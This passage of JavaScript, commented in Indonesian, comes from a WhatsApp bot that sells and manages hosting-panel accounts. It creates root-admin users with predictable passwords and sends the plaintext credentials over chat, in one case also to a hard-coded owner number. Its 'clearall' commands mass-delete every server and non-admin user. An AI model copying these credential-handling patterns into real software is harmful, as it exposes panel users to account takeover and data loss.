    // Kirim kredensial ke nomor yang dibalas
    await conn.sendMessage(target + "@s.whatsapp.net", {
        text: `
💻 *Akun Admin Panel Anda Telah Dibuat!*

👤 *Username*: ${username}
📱 *Nomor*: ${targetNumber}
🔑 *Password*: ${password}
🌐 *Login*: ${serverConfig.domain}

📌 *Simpan kredensial Anda dengan baik. Tidak ada pengiriman ulang!*

© 々 IjulTaka || 乂 Dev
`
    });

    // Kirim pemberitahuan kepada owner utama
    let ownerMain = "62895373974000@s.whatsapp.net"; // Ganti dengan nomor WhatsApp owner utama
    let notifOwner = `
📢 *Notifikasi Owner: Admin Panel Dibuat*

👤 *Pengguna*: @${targetNumber}
👤 *Dibuat oleh*: @${m.sender.split('@')[0]}
📛 *Username*: ${user.username}
🔑 *Password*: ${password}
✉️ *Email*: ${user.email}
🌐 *Server*: ${serverConfig.domain}
📆 *Waktu*: ${user.created_at}
`;

    await conn.sendMessage(ownerMain, { text: notifOwner });
}
break;

case 'adm': {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return Reply(example("📝 username"))
    
    let username = text.toLowerCase()
    let email = username + "@gmail.com"
    let name = capital(args[0])
    let password = username + "rafax"
    
    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
            "email": email,
            "username": username.toLowerCase(),
            "first_name": name,
            "last_name": "Admin",
            "root_admin": true,
            "language": "en",
            "password": password.toString()
        })
    })
    
    let data = await f.json();
    if (data.errors) return Reply("❌ Error: " + JSON.stringify(data.errors[0], null, 2))
    
    let user = data.attributes
    var orang
    
    if (m.isGroup) {
        orang = m.sender
        await Reply("✅ *Berhasil membuat admin panel!* \nData akun sudah dikirim ke private chat.")
    } else {
        orang = m.chat
    }
    
    var teks = `
*✅ Berhasil Membuat Admin Panel!*

*🔑 ID User:* ${user.id}
*👤 Nama:* ${user.first_name}
*💻 Username:* ${user.username}
*🔒 Password:* ${password.toString()}
*🌐 Login:* ${global.domain}

*📜 Rules Admin Panel ⚠️:*
1️⃣ Jangan Maling SC, Ketahuan Maling? Auto Delete Akun & No Reff!!
2️⃣ Simpan Baik-Baik Data Akun Ini
3️⃣ Buat Panel Seperlunya Aja, Jangan Asal Buat!
4️⃣ Garansi Aktif 10 Hari
5️⃣ Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await conn.sendMessage(orang, { text: teks }, { quoted: qlocJpm })
}
break

case "adm-v2": {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return Reply(example("📝 username"))
    
    let username = text.toLowerCase()
    let email = username + "@gmail.com"
    let name = capital(args[0])
    let password = username + "rafax"
    
    let f = await fetch(domainV2 + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikeyV2
        },
        "body": JSON.stringify({
            "email": email,
            "username": username.toLowerCase(),
            "first_name": name,
            "last_name": "Admin",
            "root_admin": true,
            "language": "en",
            "password": password.toString()
        })
    })
    
    let data = await f.json();
    if (data.errors) return Reply("❌ Error: " + JSON.stringify(data.errors[0], null, 2))
    
    let user = data.attributes
    var orang
    
    if (m.isGroup) {
        orang = m.sender
        await Reply("✅ *Berhasil membuat admin panel!* \nData akun sudah dikirim ke private chat.")
    } else {
        orang = m.chat
    }
    
    var teks = `
*✅ Berhasil Membuat Admin Panel!*

*🔑 ID User:* ${user.id}
*👤 Nama:* ${user.first_name}
*💻 Username:* ${user.username}
*🔒 Password:* ${password.toString()}
*🌐 Login:* ${global.domainV2}

*📜 Rules Admin Panel ⚠️:*
1️⃣ Jangan Maling SC, Ketahuan Maling? Auto Delete Akun & No Reff!!
2️⃣ Simpan Baik-Baik Data Akun Ini
3️⃣ Buat Panel Seperlunya Aja, Jangan Asal Buat!
4️⃣ Garansi Aktif 10 Hari
5️⃣ Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await conn.sendMessage(orang, { text: teks }, { quoted: qlocJpm })
}
break

case 'adp': {
if (!isCreator) return Reply(mess.owner)
 if (!args[0] || (args[1] !== "stop" && args[1] !== "start")) {
 return Reply(`*Format salah*\nPenggunaan: ${prefix+command} <ID Admin> <stop|start>`);
 }

 let action = args[1]; // Ambil aksi (stop/start)
 let cek = await fetch(domain + "/api/application/users?page=1", {
 "method": "GET",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey
 }
 });

 let res2 = await cek.json();
 let users = res2.data;
 let targetUsername = null;
 let targetId = null;
 let targetEmail = null;
 let targetFirstName = null;
 let targetLastName = null;

 // Iterasi untuk mencari admin berdasarkan ID
 await Promise.all(users.map(async (e) => {
 if (e.attributes.id == args[0] && e.attributes.root_admin == (action === "stop")) {
 targetUsername = e.attributes.username;
 targetId = e.attributes.id;
 targetEmail = e.attributes.email;
 targetFirstName = e.attributes.first_name;
 targetLastName = e.attributes.last_name;

 // Mengubah root_admin sesuai aksi
 let updateAdmin = await fetch(domain + `/api/application/users/${targetId}`, {
 "method": "PATCH",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey
 },
 "body": JSON.stringify({
 username: targetUsername,
 email: targetEmail,
 first_name: targetFirstName,
 last_name: targetLastName,
 root_admin: action === "start" // true jika start, false jika stop
 })
 });

 if (updateAdmin.ok) {
 let status = action === "start" ? "mengaktifkan kembali" : "menghentikan";
 Reply(`Berhasil ${status} hak admin: *${targetUsername}*`);
 } else {
 let errorResponse = await updateAdmin.json();
 let errorDetails = errorResponse.errors
 ? errorResponse.errors.map(err => `${err.detail}`).join(", ")
 : "Terjadi kesalahan yang tidak diketahui.";
 let status = action === "start" ? "mengaktifkan kembali" : "menghentikan";
 Reply(`Gagal ${status} hak admin *${targetUsername}*: ${errorDetails}`);
 }
 }
 }));

 if (targetId == null) {
 let status = action === "start" ? "bukan pengguna biasa" : "bukan admin";
 return Reply(`ID admin tidak ditemukan atau pengguna tersebut ${status}!`);
 }
}
break;

case 'adp-v2': {
if (!isCreator) return Reply(mess.owner)
 if (!args[0] || (args[1] !== "stop" && args[1] !== "start")) {
 return Reply(`*Format salah*\nPenggunaan: ${prefix+command} <ID Admin> <stop|start>`);
 }

 let action = args[1]; // Ambil aksi (stop/start)
 let cek = await fetch(domainV2 + "/api/application/users?page=1", {
 "method": "GET",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikeyV2
 }
 });

 let res2 = await cek.json();
 let users = res2.data;
 let targetUsername = null;
 let targetId = null;
 let targetEmail = null;
 let targetFirstName = null;
 let targetLastName = null;

 // Iterasi untuk mencari admin berdasarkan ID
 await Promise.all(users.map(async (e) => {
 if (e.attributes.id == args[0] && e.attributes.root_admin == (action === "stop")) {
 targetUsername = e.attributes.username;
 targetId = e.attributes.id;
 targetEmail = e.attributes.email;
 targetFirstName = e.attributes.first_name;
 targetLastName = e.attributes.last_name;

 // Mengubah root_admin sesuai aksi
 let updateAdmin = await fetch(domainV2 + `/api/application/users/${targetId}`, {
 "method": "PATCH",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikeyV2
 },
 "body": JSON.stringify({
 username: targetUsername,
 email: targetEmail,
 first_name: targetFirstName,
 last_name: targetLastName,
 root_admin: action === "start" // true jika start, false jika stop
 })
 });

 if (updateAdmin.ok) {
 let status = action === "start" ? "mengaktifkan kembali" : "menghentikan";
 Reply(`Berhasil ${status} hak admin: *${targetUsername}*`);
 } else {
 let errorResponse = await updateAdmin.json();
 let errorDetails = errorResponse.errors
 ? errorResponse.errors.map(err => `${err.detail}`).join(", ")
 : "Terjadi kesalahan yang tidak diketahui.";
 let status = action === "start" ? "mengaktifkan kembali" : "menghentikan";
 Reply(`Gagal ${status} hak admin *${targetUsername}*: ${errorDetails}`);
 }
 }
 }));

 if (targetId == null) {
 let status = action === "start" ? "bukan pengguna biasa" : "bukan admin";
 return Reply(`ID admin tidak ditemukan atau pengguna tersebut ${status}!`);
 }
}
break;

case 'clear': {
if (!isCreator) return m.reply(mess.owner)
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname} ⚡`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: '🔥 Ini Pesan InteractiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '🛠 Pilih Clear User & Server Lain',
          sections: [
            {
              title: '📌 List Clear User & Server',
              rows: [
                {
                  title: '🧹 CLEAR USER & SERVER 1',
                  description: '🔄 Membersihkan user & server pertama',
                  id: '.clearall'
                },
                {
                  title: '🧼 CLEAR USER & SERVER 2',
                  description: '🔄 Membersihkan user & server kedua',
                  id: '.clearall-v2'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: global.image.reply}, 
  caption: "\n🛑 ```SILAHKAN PILIH FITUR DIBAWAH INI !!``` 🛑\n"
}, {quoted: qtext2})
}
break

case 'clearall': {
if (!isCreator) return m.reply(mess.owner)

    try {
        // Ambil semua server
        let serverFetch = await fetch(domain + "/api/application/servers", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey,
            }
        });

        let serverRes = await serverFetch.json();
        let servers = serverRes.data;

        if (!servers || servers.length === 0) {
            Reply('Tidak ada server yang ditemukan.');
        } else {
            // Loop melalui setiap server dan menghapusnya
            for (let server of servers) {
                let s = server.attributes;

                let deleteServer = await fetch(domain + "/api/application/servers/" + s.id, {
                    method: "DELETE",
                    headers: {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey,
                    }
                });

                if (deleteServer.ok) {
                    Reply(`*Berhasil menghapus server dengan ID: ${s.id}*`);
                } else {
                    let errorText = await deleteServer.text();
                    Reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
                }
            }
            Reply('*Semua server berhasil dihapus!*');
        }

        // Ambil semua user
        let userFetch = await fetch(domain + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey,
            }
        });

        let userRes = await userFetch.json();
        let users = userRes.data;

        if (!users || users.length === 0) {
            Reply('Tidak ada user yang ditemukan.');
        } else {
            // Loop melalui setiap user dan hapus jika bukan admin
            for (let user of users) {
                let u = user.attributes;

                if (!u.root_admin) {
                    let deleteUser = await fetch(domain + "/api/application/users/" + u.id, {
                        method: "DELETE",
                        headers: {
                            "Accept": "application/json",
                            "Content-Type": "application/json",
                            "Authorization": "Bearer " + apikey,
                        }
                    });

                    if (deleteUser.ok) {
                        Reply(`*Berhasil menghapus user dengan ID: ${u.id}*`);
                    } else {
                        let errorText = await deleteUser.text();
                        Reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
                    }
                }
            }
            Reply('*Semua user kecuali admin berhasil dihapus!*');
        }
        
    } catch (error) {
        return Reply('Terjadi kesalahan: ' + error.message);
    }
}
break

case 'clearall-v2': {
if (!isCreator) return m.reply(mess.owner)

    try {
        // Ambil semua server
        let serverFetch = await fetch(domainV2 + "/api/application/servers", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikeyV2,
            }
        });

        let serverRes = await serverFetch.json();
        let servers = serverRes.data;

        if (!servers || servers.length === 0) {
            Reply('Tidak ada server yang ditemukan.');
        } else {
            // Loop melalui setiap server dan menghapusnya
            for (let server of servers) {
                let s = server.attributes;

                let deleteServer = await fetch(domainV2 + "/api/application/servers/" + s.id, {
                    method: "DELETE",
                    headers: {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikeyV2,
                    }
                });

                if (deleteServer.ok) {
                    Reply(`*Berhasil menghapus server dengan ID: ${s.id}*`);
                } else {
                    let errorText = await deleteServer.text();
                    Reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
                }
            }
            Reply('*Semua server berhasil dihapus!*');
        }

        // Ambil semua user
        let userFetch = await fetch(domainV2 + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikeyV2,
            }
        });

        let userRes = await userFetch.json();
        let users = userRes.data;

        if (!users || users.length === 0) {
            Reply('Tidak ada user yang ditemukan.');
        } else {
            // Loop melalui setiap user dan hapus jika bukan admin
            for (let user of users) {
                let u = user.attributes;

                if (!u.root_admin) {
                    let deleteUser = await fetch(domainV2 + "/api/application/users/" + u.id, {
                        method: "DELETE",
                        headers: {
                            "Accept": "application/json",
                            "Content-Type": "application/json",
                            "Authorization": "Bearer " + apikeyV2,
                        }
                    });

                    if (deleteUser.ok) {
                        Reply(`*Berhasil menghapus user dengan ID: ${u.id}*`);
                    } else {
                        let errorText = await deleteUser.text();
                        Reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
                    }
                }
            }
            Reply('*Semua user kecuali admin berhasil dihapus!*');
        }
        
    } catch (error) {
        return Reply('Terjadi kesalahan: ' + error.message);
    }
}
break

case 'cadmin': {
if (!text) return Reply(example("nama,6283XXX"))
if (!isCreator) return Reply(mess.owner)
if (!args[0]) return Reply(example("nama,6283XXX"))
if (!text.split(",")) return Reply(example("nama,6283XXX"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return Reply(example("nama,6283XXX"))
var ceknya = text.split(",")[1]
if (!ceknya) return Reply(example("nama,6283XXX"))
var clien = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await conn.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let username = buyyer.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
await m.reply(`*Berhasil Membuat Akun Admin Panel ✅*\nData Akun Sudah Dikirim Ke Nomor ${ceknya}`)
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Created :* ${user.created_at.split("T")[0]}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian

* *Link Group:*
* ${linkadp}

`
let msgii = await generateWAMessageFromContent(clien, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: clien, quoted: m}) 
await conn.relayMessage(clien, msgii.message, { 
messageId: msgii.key.id 
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'cadmin-v2': {
if (!text) return m.reply(example("nama,6283XXX"))
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(example("nama,6283XXX"))
if (!text.split(",")) return m.reply(example("nama,6283XXX"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return m.reply(example("nama,6283XXX"))
var ceknya = text.split(",")[1]
if (!ceknya) return m.reply(example("nama,6283XXX"))
var clien = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await conn.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let username = buyyer.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
await m.reply(`*Berhasil Membuat Akun Admin Panel ✅*\nData Akun Sudah Dikirim Ke Nomor ${ceknya}`)
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Created :* ${user.created_at.split("T")[0]}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian

* *Link Group:*
* ${linkadp}

`
let msgii = await generateWAMessageFromContent(clien, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domainV2}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: clien, quoted: m}) 
await conn.relayMessage(clien, msgii.message, { 
messageId: msgii.key.id 
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

// Fungsi untuk menentukan batas waktu (Telat)
function getTelat(days) {
    const waktu = new Date();
    waktu.setHours(waktu.getHours() + 7); // WIB
    waktu.setDate(waktu.getDate() + days); // Tambah jumlah hari
    const options = {
        weekday: 'long',
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
    };
    return waktu.toLocaleDateString('id-ID', options);
}

case 'addhutang':
case 'adddp': {
    if (!isCreator) return Reply(mess.owner);

    if (m.quoted || text) {
        const [userId, nominal, days, type, ...deskripsi] = text.split("|").map(v => v.trim());
        // Format: @tag|nominal|Telat(hari)|tipe(hutang/dp)|deskripsi

        if (!userId || !nominal || !days || !type || deskripsi.length < 1) {
            return Reply(`⚠️ *Format salah!* Gunakan:\n${command} @tag|nominal|Telat(hari)|tipe(hutang/dp)|deskripsi`);
        }

        if (type !== "Hutang" && type !== "Dp") {
            return Reply("⚠️ *Tipe salah!* Harus salah satu dari: hutang atau dp.");
        }

        const orang = userId.includes("@s.whatsapp.net")
            ? userId
            : userId.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

        if (hutangList.find(h => h.user === orang && h.type === type)) {
            return m.reply(`❌ *Gagal!* User *@${orang.split('@')[0]}* sudah terdaftar dengan tipe ${type}.`);
        }

        const newData = {
            user: orang,
            nominal: parseInt(nominal),
            deskripsi: deskripsi.join(" "),
            waktu: getWaktuWIB(),
            Telat: getTelat(parseInt(days)),
            type: type, // Menyimpan tipe (hutang atau dp)
            deadline: Date.now() + parseInt(days) * 24 * 60 * 60 * 1000 // Menyimpan batas waktu
        };

        hutangList.push(newData);
        fs.writeFileSync("./src/hutang.json", JSON.stringify(hutangList, null, 2));

        m.reply(`✅ *Berhasil menambahkan ${type}:*\n` +
                `👤 *User*: @${orang.split('@')[0]}\n` +
                `💵 *Nominal*: Rp${newData.nominal}\n` +
                `📝 *Deskripsi*: ${newData.deskripsi}\n` +
                `⏰ *Waktu*: ${newData.waktu}\n` +
                `🕒 *Telat*: ${newData.Telat}\n` +
                `⚠️ *NOTE*: JIKA WAKTU TELAT SUDAH MELEWATI, OTOMATIS BOT MENGELUARKAN ANDA !! JADI TOLONG BAYAR SECEPATNYA.`);
    } else {
        return m.reply(`⚠️ *Format salah!* Gunakan:\n${command} @tag|nominal|Telat(hari)|tipe(hutang/dp)|deskripsi`);
    }

    // Proses cek otomatis pengguna yang melampaui batas waktu
    setInterval(() => {
        const now = Date.now();
        hutangList.forEach((hutang, index) => {
            if (hutang.deadline <= now) {
                try {
                    m.groupParticipantsUpdate(hutang.user, "remove"); // Kick user dari grup
                    m.reply(`⚠️ *User @${hutang.user.split('@')[0]} telah melampaui batas waktu hutang/dp dan dikeluarkan dari grup.*`);
                    hutangList.splice(index, 1); // Hapus dari daftar hutang
                    fs.writeFileSync("./src/hutang.json", JSON.stringify(hutangList, null, 2));
                } catch (err) {
                    console.error(`❌ Gagal mengeluarkan user @${hutang.user.split('@')[0]}:`, err);
                }
            }
        });
    }, 60 * 1000); // Cek setiap 1 menit
}
break;

case 'addpendapatan': {
    if (!isCreator) return Reply(mess.owner);

    if (m.quoted || text) {
        const [harga, namaBarang, pembayaran, total, tanggal] = text.split("|").map(v => v.trim());
        // Format: harga|nama barang|pembayaran|total|tanggal

        if (!harga || !namaBarang || !pembayaran || !total || !tanggal) {
            return Reply(`⚠️ *Format salah!* Gunakan:\n${command} harga|nama barang|pembayaran|total|tanggal`);
        }

        const newData = {
            harga: parseInt(harga),
            namaBarang: namaBarang,
            pembayaran: pembayaran,
            total: parseInt(total),
            tanggal: tanggal,
            waktu: getWaktuWIB() // Fungsi untuk mendapatkan waktu dalam WIB
        };

        pendapatanList.push(newData);
        fs.writeFileSync("./src/pendapatan.json", JSON.stringify(pendapatanList, null, 2));

        m.reply(`✅ *Berhasil menambahkan pendapatan:*\n` +
                `📦 *Nama Barang*: ${newData.namaBarang}\n` +
                `💰 *Harga*: Rp${newData.harga}\n` +
                `💳 *Pembayaran*: ${newData.pembayaran}\n` +
                `📊 *Total*: Rp${newData.total}\n` +
                `📅 *Tanggal*: ${newData.tanggal}\n` +
                `⏰ *Waktu*: ${newData.waktu}`);
    } else {
        return m.reply(`⚠️ *Format salah!* Gunakan:\n${command} harga|nama barang|pembayaran|total|tanggal`);
    }
}
break;

case 'addbot': case 'adddb': {
    if (!isCreator) return Reply(mess.owner);

    if (m.quoted || text) {
        const [nomorBot, namaOwner, nomorOwner] = text.split(",").map(v => v.trim());
        // Format: NomorBot,Nama Owner,Nomor Owner

        if (!nomorBot || !namaOwner || !nomorOwner) {
            return Reply(`⚠️ *Format salah!* Gunakan:\n${command} NomorBot,Nama Owner,Nomor Owner`);
        }

        const newBot = {
            nomorBot: nomorBot,
            namaOwner: namaOwner,
            nomorOwner: nomorOwner,
            waktu: getWaktuWIB() // Fungsi untuk mendapatkan waktu dalam WIB
        };

        botList.push(newBot);
        fs.writeFileSync("./src/botlist.json", JSON.stringify(botList, null, 2));

        Reply(`✅ *Berhasil menambahkan bot:*\n` +
                `🤖 *Nomor Bot*: ${newBot.nomorBot}\n` +
                `👤 *Nama Owner*: ${newBot.namaOwner}\n` +
                `📞 *Nomor Owner*: ${newBot.nomorOwner}\n` +
                `⏰ *Waktu*: ${newBot.waktu}`);
    } else {
        return Reply(`⚠️ *Format salah!* Gunakan:\n${command} NomorBot,Nama Owner,Nomor Owner`);
    }
}
break;

case 'addlistadp': case 'addadp': {
        if (m.quoted || text) {
        const namaAdmin = text.trim(); // Hanya mengambil nama admin

        if (!namaAdmin) {
            return Reply(`⚠️ *Format salah!* Gunakan:\n${command} Nama Admin`);
        }

        const newAdmin = {
            namaAdmin: namaAdmin,
            waktu: getWaktuWIB() // Fungsi untuk mendapatkan waktu dalam WIB
        };

        adminPanelList.push(newAdmin);
        fs.writeFileSync("./src/adplist.json", JSON.stringify(adminPanelList, null, 2));

        Reply(`✅ *Berhasil menambahkan admin panel:*\n` +
              `👤 *Nama Admin*: ${newAdmin.namaAdmin}\n` +
              `⏰ *Waktu*: ${newAdmin.waktu}`);
    } else {
        return Reply(`⚠️ *Format salah!* Gunakan:\n${command} Nama Admin`);
    }
}
break;

case 'dellistadp': case 'deladp': {
    if (!isCreator) return Reply(mess.owner);

    if (m.quoted || text) {
        const namaAdmin = text.trim(); // Hanya mengambil nama admin

        if (!namaAdmin) {
            return Reply(`⚠️ *Format salah!* Gunakan:\n${command} Nama Admin`);
        }

        // Mencari index admin yang akan dihapus
        const index = adminPanelList.findIndex(admin => admin.namaAdmin.toLowerCase() === namaAdmin.toLowerCase());

        if (index === -1) {
            return Reply(`⚠️ *Admin dengan nama "${namaAdmin}" tidak ditemukan dalam daftar!*`);
        }

        // Menghapus admin dari daftar
        adminPanelList.splice(index, 1);
        fs.writeFileSync("./src/adplist.json", JSON.stringify(adminPanelList, null, 2));

        Reply(`✅ *Berhasil menghapus admin panel:*\n` +
              `👤 *Nama Admin*: ${namaAdmin}`);
    } else {
        return Reply(`⚠️ *Format salah!* Gunakan:\n${command} Nama Admin`);
    }
}
break;

case 'listadp': {
    if (!isCreator) return Reply(mess.owner);

    if (adminPanelList.length === 0) return Reply("📋 *Daftar Admin Panel kosong!*");

    let listText = "📋 *Daftar Admin Panel:*\n\n";
    adminPanelList.forEach((admin, index) => listText += `🔹 ${index + 1}. ${admin.namaAdmin} (⏰ ${admin.waktu})\n`);

    listText += `\n📊 *Total Admin Panel:* ${adminPanelList.length}`;

    await conn.sendMessage(m.chat, {
        text: listText,
        footer: `© 2025 ${botname}`,
        buttons: [{ buttonId: `.deladmin`, buttonText: { displayText: '🗑 Hapus Admin Panel' }, type: 1 }],
        headerType: 1,
        viewOnce: true,
        contextInfo: { isForwarded: true, mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"] },
    }, { quoted: m });
}
break;

case 'delhutang':
case 'deldp': {
    if (!isCreator) return m.reply(mess.owner);

    const [userId, type] = text.split("|").map(v => v.trim());
    // Format: @tag|tipe(hutang/dp)

    if (!userId || !type) {
        return m.reply(`⚠️ *Format salah!* Gunakan: \n${command} @tag|tipe(hutang/dp)`);
    }

    if (type !== "Hutang" && type !== "Dp") {
        return m.reply("⚠️ *Tipe salah!* Harus salah satu dari: hutang atau dp.");
    }

    const input = userId.includes("@s.whatsapp.net")
        ? userId
        : userId.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const index = hutangList.findIndex(h => h.user === input && h.type === type);

    if (index === -1) {
        return m.reply(`❌ *Gagal!* Nomor *@${input.split("@")[0]}* tidak ditemukan dalam daftar ${type}.`);
    }

    // Menghapus data hutang/DP dari daftar
    const deletedData = hutangList.splice(index, 1)[0];
    fs.writeFileSync("./src/hutang.json", JSON.stringify(hutangList, null, 2));

    // Menonaktifkan tindakan penghapusan otomatis dari grup
    clearTimeout(deletedData.timeoutId);

    m.reply(`✅ *Berhasil menghapus ${type}:*\n` +
            `👤 *User*: @${deletedData.user.split("@")[0]}\n` +
            `💵 *Nominal*: Rp${deletedData.nominal}\n` +
            `📝 *Deskripsi*: ${deletedData.deskripsi}\n` +
            `🕒 *Telat*: ${deletedData.Telat}`);
}
break;

case 'delpendapatan': {
    if (!isCreator) return m.reply(mess.owner);

    const namaBarang = text.trim();
    // Format: nama barang

    if (!namaBarang) {
        return Reply(`⚠️ *Format salah!* Gunakan:\n${command} nama barang`);
    }

    const index = pendapatanList.findIndex(p => p.namaBarang === namaBarang);

    if (index === -1) {
        return Reply(`❌ *Gagal!* Data dengan nama barang *${namaBarang}* tidak ditemukan.`);
    }

    // Menghapus data pendapatan dari daftar
    const deletedData = pendapatanList.splice(index, 1)[0];
    fs.writeFileSync("./src/pendapatan.json", JSON.stringify(pendapatanList, null, 2));

    m.reply(`✅ *Berhasil menghapus pendapatan:*\n` +
            `📦 *Nama Barang*: ${deletedData.namaBarang}\n` +
            `💰 *Harga*: Rp${deletedData.harga}\n` +
            `💳 *Pembayaran*: ${deletedData.pembayaran}\n` +
            `📊 *Total*: Rp${deletedData.total}\n` +
            `📅 *Tanggal*: ${deletedData.tanggal}\n` +
            `⏰ *Waktu*: ${deletedData.waktu}`);
}
break;

case 'delbot': case 'deldb': {
    if (!isCreator) return m.reply(mess.owner);

    const nomorBot = text.trim();
    // Format: NomorBot

    if (!nomorBot) {
        return Reply(`⚠️ *Format salah!* Gunakan:\n${command} NomorBot`);
    }

    const index = botList.findIndex(bot => bot.nomorBot === nomorBot);

    if (index === -1) {
        return Reply(`❌ *Gagal!* Bot dengan nomor *${nomorBot}* tidak ditemukan.`);
    }

    // Menghapus data bot dari daftar
    const deletedBot = botList.splice(index, 1)[0];
